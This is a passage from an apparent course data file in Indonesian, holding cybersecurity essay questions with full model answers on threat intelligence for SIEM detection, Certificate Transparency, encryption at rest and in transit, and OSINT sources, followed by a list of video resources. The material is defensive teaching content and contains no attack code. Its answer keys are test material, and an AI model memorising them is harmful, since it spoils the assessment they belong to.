Symmetric untuk enkripsi data aktual yang efisien (setelah shared key ditetapkan melalui asymmetric); Hash untuk memverifikasi integritas setiap paket data. Ini adalah hybrid encryption — memaksimalkan keamanan dan efisiensi sekaligus.",
      type: "essay",
    },
    {
      id: 10,
      question: "Sebuah perusahaan menemukan bahwa server mereka telah menjadi bagian dari kampanye APT selama 3 bulan. Jelaskan bagaimana threat intelligence (IoC dan TTP) dari insiden ini dapat digunakan secara proaktif untuk: (a) memperkuat deteksi SIEM, (b) memperbaiki postur keamanan jangka panjang.",
      answer: "(a) Penggunaan TI untuk memperkuat SIEM: IoC yang dikumpulkan dari insiden ini (IP C2, domain, file hash, registry key, string malware) dimasukkan sebagai watchlist di SIEM — trigger alert jika IoC muncul di log manapun. Correlation rules dibuat berdasarkan pola lateral movement yang diamati: 'jika ada akses RDP ke > 5 host berbeda dalam 1 jam dari satu account = suspicious'. Baseline perilaku normal diperbarui untuk mendeteksi anomali serupa: akses di luar jam kerja, volume data transfer tidak biasa, proses baru yang tidak ada di whitelist. YARA rules dibuat berdasarkan signature malware untuk mendeteksi variant. Network detection rules (Suricata/Snort) dibuat untuk pola traffic C2 yang diamati (beacon interval, user-agent string, URI pattern). (b) Penggunaan TI untuk postur jangka panjang: Pemetaan TTP ke MITRE ATT&CK mengidentifikasi technique mana yang berhasil — misalnya T1566.001 Spearphishing Attachment untuk initial access, T1003 Credential Dumping untuk privilege escalation. Setiap technique yang berhasil digunakan penyerang menunjukkan gap dalam defense: spearphishing berhasil = butuh email filtering lebih baik + security awareness training; credential dumping berhasil = butuh proteksi LSASS + MFA. Laporan post-incident di-sharing ke ISAC industri sehingga perusahaan lain bisa defend dari ancaman yang sama. Security roadmap diperbarui: gap analysis berdasarkan technique yang berhasil dieksploitasi, prioritas perbaikan berdasarkan CVSS dan business impact. Vulnerability yang dieksploitasi di-patch dan program patch management diperkuat untuk mencegah recurrence.",
      type: "essay",
    },
    {
      id: 11,
      question: "Jelaskan bagaimana Certificate Transparency (CT) bekerja dan mengapa mekanisme ini penting untuk ekosistem PKI. Bagaimana seorang administrator keamanan dapat memanfaatkan CT untuk mendeteksi sertifikat yang diterbitkan secara tidak sah untuk domain mereka?",
      answer: "Certificate Transparency (CT) adalah framework open source yang mengharuskan semua Certificate Authority (CA) publik untuk me-log setiap sertifikat yang mereka terbitkan ke dalam public, append-only, cryptographically-verifiable log. CT dibuat sebagai respons terhadap kasus DigiNotar (2011) di mana CA jahat/dikompromis menerbitkan sertifikat palsu untuk google.com tanpa sepengetahuan Google. Cara kerja CT: (1) CA menerbitkan sertifikat, CA harus mengirimnya ke minimal 2 CT log sebelum bisa digunakan; (2) CT log adalah Merkle hash tree yang append-only — setiap entri tidak dapat dihapus atau dimodifikasi tanpa terdeteksi karena hash tree akan rusak; (3) CT log mengembalikan Signed Certificate Timestamp (SCT) — bukti kriptografis bahwa cert sudah di-log; (4) Browser memeriksa bahwa sertifikat yang diterima memiliki SCT yang valid dari log yang dikenal; (5) Monitor secara independent mengawasi CT log dan memberikan alert jika ada sertifikat mencurigakan. Mengapa penting: setiap sertifikat yang diterbitkan kini dapat dilihat publik — CA tidak bisa lagi menerbitkan sertifikat secara sembunyi-sembunyi; domain owner dapat memonitor semua sertifikat yang diterbitkan untuk domain mereka. Pemanfaatan oleh administrator: (1) Monitor CT log menggunakan tools seperti crt.sh, Facebook Certificate Transparency Monitoring, atau Google Certificate Transparency; (2) Setup alert: 'beritahu saya jika ada sertifikat baru yang diterbitkan untuk *.perusahaan.com' — ini mendeteksi brand impersonation atau rogue CA; (3) Reguler audit sertifikat aktif yang terdaftar di CT untuk domain perusahaan — identifikasi sertifikat yang tidak seharusnya ada; (4) Integrasi dengan threat intel platform untuk korelasi sertifikat mencurigakan dengan kampanye phishing yang diketahui.",
      type: "essay",
    },
    {
      id: 12,
      question: "Apa perbedaan antara enkripsi data 'at-rest' dan 'in-transit'? Berikan contoh ancaman spesifik yang dimitigasi oleh masing-masing, dan jelaskan implementasi teknis yang direkomendasikan untuk setiap jenis enkripsi dalam konteks sistem perbankan.",
      answer: "Enkripsi at-rest melindungi data yang disimpan di media penyimpanan (disk, SSD, tape, backup) saat tidak sedang aktif digunakan. Ancaman yang dimitigasi: pencurian fisik media penyimpanan (laptop dicuri, hard drive dibuang tanpa secure erase), akses tidak sah ke backup media, insider yang mengakses file sistem langsung tanpa melalui aplikasi, rogue snapshot cloud (di cloud, penyedia cloud secara teoritis bisa mengakses storage). Implementasi untuk bank: Full Disk Encryption menggunakan BitLocker (Windows) atau LUKS (Linux) dengan AES-256; Database Transparent Data Encryption (TDE) — SQL Server/Oracle/PostgreSQL mendukung TDE yang mengenkripsi datafile secara otomatis; Column-level encryption untuk data sangat sensitif (nomor rekening, PIN); Encrypted backup dengan key terpisah dari data; Kunci enkripsi dikelola oleh HSM (Hardware Security Module) atau KMS (Key Management Service) — bukan di server yang sama dengan data. Enkripsi in-transit melindungi data yang sedang bergerak melalui jaringan antara dua titik. Ancaman yang dimitigasi: sniffing jaringan oleh insider atau external attacker (misalnya di jaringan publik), MITM attack yang mengintersep dan memodifikasi traffic, passive surveillance oleh ISP atau pemerintah, replay attack. Implementasi untuk bank: TLS 1.3 dengan ECDHE untuk semua API komunikasi (mobile banking, internet banking, inter-service); Minimum cipher suite: TLS_AES_256_GCM_SHA384 atau TLS_CHACHA20_POLY1305_SHA256; Certificate pinning di aplikasi mobile banking; HSTS dengan preloading untuk semua domain publik; VPN untuk akses karyawan dari luar kantor; mTLS (mutual TLS) untuk komunikasi antar microservice internal; Enkripsi database connection string: MySQL SSL mode = REQUIRED; Enkripsi payload level aplikasi untuk data sangat sensitif (field-level encryption) sebagai defense-in-depth bahkan jika TLS dikompromis.",
      type: "essay",
    },
    {
      id: 13,
      question: "Jelaskan konsep OSINT (Open Source Intelligence) untuk keperluan threat intelligence. Berikan 5 contoh sumber OSINT yang berbeda, informasi apa yang dapat dikumpulkan dari masing-masing, dan bagaimana informasi tersebut digunakan untuk meningkatkan keamanan organisasi.",
      answer: "OSINT adalah pengumpulan dan analisis informasi dari sumber yang tersedia secara publik tanpa memerlukan akses khusus atau izin khusus. Dalam threat intelligence, OSINT digunakan untuk memahami landscape ancaman, mengidentifikasi IoC baru, memonitor kebocoran data, dan mempelajari teknik penyerang. 5 contoh sumber OSINT dan pemanfaatannya: (1) VirusTotal (virustotal.com): Upload file atau hash untuk dianalisis oleh 70+ antivirus engine. Informasi: apakah file adalah malware, jenis malware, similarity ke malware lain, network traffic pattern malware. Pemanfaatan: verifikasi apakah file yang diterima karyawan berbahaya; cek hash software sebelum diinstall; analisis email attachment mencurigakan. (2) Shodan (shodan.io): Search engine untuk device yang terhubung ke internet. Informasi: port yang terbuka, versi software, geolokasi, banner service, default credential yang masih aktif. Pemanfaatan: cek apakah server organisasi terekspos ke internet secara tidak sengaja; temukan device IoT yang salah konfigurasi; identifikasi versi software yang rentan CVE. (3) Have I Been Pwned (haveibeenpwned.com): Database email/password dari breach yang diketahui publik. Informasi: apakah email karyawan ada dalam breach database, dari breach apa. Pemanfaatan: notifikasi jika credential karyawan bocor; force password reset; deteksi credential stuffing risk. (4) CVE/NVD Database (cve.org, nvd.nist.gov): Database kerentanan yang diketahui secara resmi. Informasi: CVSS score, deskripsi kerentanan, produk yang terdampak, patch yang tersedia, PoC exploit. Pemanfaatan: vulnerability management — identifikasi CVE yang mempengaruhi software yang digunakan; prioritasi patching berdasarkan CVSS score dan exploitability. (5) Certificate Transparency Logs (crt.sh): Public log semua sertifikat TLS yang diterbitkan. Informasi: semua sertifikat aktif untuk domain tertentu, termasuk wildcard dan subdomain. Pemanfaatan: deteksi phishing domain yang menyerupai domain perusahaan; inventori sertifikat yang digunakan; deteksi sertifikat yang diterbitkan tanpa sepengetahuan IT.",
      type: "essay",
    },
  ],

  // ─── VIDEO RESOURCES ─────────────────────────────────────────────────────────
  videoResources: [
    {
      title: "Threat Intelligence Fundamentals — Pyramid of Pain",
      youtubeId: "lauPTkBMaJo",
      description: "Dasar-dasar threat intelligence, tipe-tipe intel, Pyramid of Pain, dan cara menggunakannya dalam SOC.",
      language: "en",
      duration: "16:30",
    },
    {
      title: "Cryptography Explained — Hashing, Symmetric, Asymmetric",
      youtubeId: "jhXCTbFnK8o",
      description: "Penjelasan komprehensif tiga kategori kriptografi dengan contoh nyata dan visualisasi.",
      language: "en",
      duration: "12:15",
    },
    {
      title: "How SSL/TLS Works — PKI and Certificate Chain of Trust",
      youtubeId: "j9QmMEWmcfo",
      description: "Cara kerja SSL/TLS, PKI, certificate chain of trust, dan kenapa HTTPS penting.",
      language: "en",
      duration: "14:50",
    },
    {
      title: "Public Key Cryptography — RSA Algorithm Explained",
      youtubeId: "AQDCe585Lnc",
      description: "Penjelasan matematika di balik RSA dan bagaimana enkripsi asimetris bekerja.",
      language: "en",
      duration: "11:20",
    },
    {
      title: "MITRE ATT&CK Framework — Threat Intelligence for SOC",
      youtubeId: "GCvOguLBJ0E",
      description: "Cara menggunakan MITRE ATT&CK Framework untuk menganalisis TTP threat actor dan meningkatkan detection.",
      language: "en",
      duration: "18:45",
    },
  ],
};
